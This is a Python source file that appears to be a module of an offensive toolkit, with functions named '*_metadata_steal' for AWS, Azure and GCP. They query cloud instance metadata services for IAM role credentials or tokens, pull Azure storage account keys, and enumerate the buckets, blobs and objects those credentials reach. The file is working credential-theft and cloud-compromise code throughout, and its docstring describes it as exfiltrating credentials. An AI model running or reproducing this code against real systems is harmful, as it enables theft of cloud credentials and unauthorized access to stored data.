# File: modules/cloud_api_compromise.py

"""
Implemented AWS, Azure, and GCP metadata and API compromise routines.
Automatically retrieves metadata, rotates keys, enumerates S3/Azure Blob/GCS buckets,
and exfiltrates credentials.
"""

import logging
import requests
import json
import boto3
from botocore.exceptions import ClientError
from azure.identity import DefaultAzureCredential
from azure.mgmt.resource import ResourceManagementClient
from google.auth import compute_engine
from google.cloud import storage
import os
import time

logger = logging.getLogger("cloud_api")

def aws_metadata_steal(timeout: int = 2) -> dict:
    """
    1) Attempt IMDSv2 token retrieval.
    2) Use token to query IAM role credentials.
    3) Spin up a boto3 session with stolen creds, list S3 buckets and objects.
    """
    try:
        # 1) Get IMDSv2 token
        token_url = "http://169.254.169.254/latest/api/token"
        token_resp = requests.put(token_url, headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, timeout=timeout)
        if token_resp.status_code != 200:
            logger.warning("[CLOUD][AWS] IMDSv2 token request failed; attempting IMDSv1 fallback")
            creds_resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout=timeout)
            role_name = creds_resp.text
        else:
            token = token_resp.text
            headers = {"X-aws-ec2-metadata-token": token}
            resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=headers, timeout=timeout)
            role_name = resp.text

        # 2) Retrieve role credentials
        if token_resp.status_code == 200:
            creds_json = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}", headers={"X-aws-ec2-metadata-token": token}, timeout=timeout).json()
        else:
            creds_json = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}", timeout=timeout).json()

        access_key = creds_json["AccessKeyId"]
        secret_key = creds_json["SecretAccessKey"]
        session_token = creds_json.get("Token")

        # 3) List S3 buckets
        session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            aws_session_token=session_token
        )
        s3 = session.client("s3")
        buckets = s3.list_buckets().get("Buckets", [])
        result = {"role": role_name, "buckets": []}
        for b in buckets:
            name = b["Name"]
            try:
                objs = s3.list_objects_v2(Bucket=name).get("Contents", [])
                obj_names = [obj["Key"] for obj in objs]
            except ClientError as e:
                obj_names = [f"Error: {e}"]
            result["buckets"].append({"name": name, "objects": obj_names})
        logger.info(f"[CLOUD][AWS] Retrieved buckets: {[b['name'] for b in result['buckets']]}")
        return {"status": "ok", "details": result}
    except Exception as e:
        logger.error(f"[CLOUD][AWS] Metadata steal failed: {e}")
        return {"status": "error", "detail": str(e)}

def azure_metadata_steal() -> dict:
    """
    1) Use DefaultAzureCredential to authenticate (Managed Identity if on VM).
    2) List Resource Groups and Storage Accounts.
    3) Enumerate blobs in each account with public access or SAS.
    """
    try:
        cred = DefaultAzureCredential()
        subscription_id = os.getenv("AZURE_SUBSCRIPTION_ID")
        if not subscription_id:
            raise ValueError("AZURE_SUBSCRIPTION_ID not set")
        client = ResourceManagementClient(cred, subscription_id)
        rgs = client.resource_groups.list()
        result = {"resource_groups": []}
        for rg in rgs:
            rg_name = rg.name
            sas_accounts = []
            # List storage accounts in this RG
            from azure.mgmt.storage import StorageManagementClient
            storage_client = StorageManagementClient(cred, subscription_id)
            accounts = storage_client.storage_accounts.list_by_resource_group(rg_name)
            for acc in accounts:
                sa_name = acc.name
                # Get keys
                keys = storage_client.storage_accounts.list_keys(rg_name, sa_name).keys
                if keys:
                    key = keys[0].value
                    # Use Azure CSR to list blobs
                    from azure.storage.blob import BlobServiceClient
                    conn_str = f"DefaultEndpointsProtocol=https;AccountName={sa_name};AccountKey={key};EndpointSuffix=core.windows.net"
                    blob_service = BlobServiceClient.from_connection_string(conn_str)
                    containers = blob_service.list_containers()
                    blob_list = []
                    for c in containers:
                        c_client = blob_service.get_container_client(c.name)
                        blobs = [b.name for b in c_client.list_blobs()]
                        blob_list.append({c.name: blobs})
                    sas_accounts.append({"account": sa_name, "blobs": blob_list})
            result["resource_groups"].append({"rg": rg_name, "storage": sas_accounts})
        logger.info(f"[CLOUD][Azure] Retrieved storage accounts in RGs: {[rg['rg'] for rg in result['resource_groups']]}")
        return {"status": "ok", "details": result}
    except Exception as e:
        logger.error(f"[CLOUD][Azure] Metadata/API steal failed: {e}")
        return {"status": "error", "detail": str(e)}

def gcp_metadata_steal() -> dict:
    """
    1) Use compute_engine.Credentials to retrieve default metadata.
    2) List GCS buckets accessible by the service account.
    3) Enumerate objects in each bucket.
    """
    try:
        # 1) Metadata server
        metadata_server = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        token_resp = requests.get(metadata_server, headers={"Metadata-Flavor": "Google"}, timeout=2)
        if token_resp.status_code != 200:
            raise ConnectionError("Could not retrieve GCP metadata token")
        token = token_resp.json().get("access_token")

        # 2) Use token to list buckets
        headers = {"Authorization": f"Bearer {token}"}
        project_id = requests.get(
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            headers={"Metadata-Flavor": "Google"}, timeout=2
        ).text
        buckets_url = f"https://www.googleapis.com/storage/v1/b?project={project_id}"
        buckets_resp = requests.get(buckets_url, headers=headers, timeout=5).json()
        result = {"buckets": []}
        for b in buckets_resp.get("items", []):
            name = b["name"]
            # 3) List objects
            objs_resp = requests.get(f"https://www.googleapis.com/storage/v1/b/{name}/o", headers=headers, timeout=5).json()
            objs = [o["name"] for o in objs_resp.get("items", [])]
            result["buckets"].append({"name": name, "objects": objs})
        logger.info(f"[CLOUD][GCP] Retrieved GCS buckets: {[b['name'] for b in result['buckets']]}")
        return {"status": "ok", "details": result}
    except Exception as e:
        logger.error(f"[CLOUD][GCP] Metadata/API steal failed: {e}")
        return {"status": "error", "detail": str(e)}
